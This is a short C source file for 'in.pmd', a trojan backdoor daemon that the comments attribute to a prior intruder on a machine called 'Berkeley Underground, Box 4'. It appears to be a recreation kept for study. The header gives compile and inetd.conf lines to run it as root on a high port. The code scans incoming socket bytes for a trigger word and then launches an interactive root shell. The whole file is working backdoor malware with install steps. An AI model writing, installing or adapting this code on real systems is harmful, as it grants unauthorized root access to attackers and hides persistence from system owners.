/*
 * in.pmd  --  "port monitor daemon".  Berkeley Underground, Box 4 backdoor.
 *
 * The prior intruder's persistence: a trojan daemon wired to inetd on a high port
 * and run as root.  The first line that arrives on the connection is checked
 * against the magic word; on a match it opens a root shell on the socket (inetd
 * has already dup'd the socket onto stdin/stdout/stderr, and the service runs as
 * root, so the shell is root).  Anything else: silent disconnect.
 *
 * cf ~/takedown TIMELINE 4007 -- 'sportd' renamed to 'in.pmd', launched from
 * inetd on port 5553, trigger word 'wank'.
 *
 *   cc -DMAGIC='"wank"' -o in.pmd in.pmd.c
 *   inetd.conf:  pmd stream tcp nowait root /usr/libexec/in.pmd in.pmd
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#ifndef MAGIC
#define MAGIC "wank"
#endif

int main(int argc, char **argv)
{
	char buf[1024];
	int total = 0, n, i, ml = strlen(MAGIC);

	/* Read raw bytes and scan for the magic word ANYWHERE in the stream.  A
	 * client like telnet prepends IAC option-negotiation bytes (and may split
	 * the trigger across reads), so a line-based strcmp would never match —
	 * accumulate and memcmp-scan instead (binary/NUL-tolerant). */
	while (total < (int)sizeof buf - 1) {
		n = read(0, buf + total, sizeof buf - 1 - total);
		if (n <= 0)
			break;
		total += n;
		for (i = 0; i + ml <= total; i++)
			if (memcmp(buf + i, MAGIC, ml) == 0) {
				execl("/bin/sh", "sh", "-i", (char *)NULL);
				perror("in.pmd: exec");
				return 1;
			}
	}
	return 0;
}
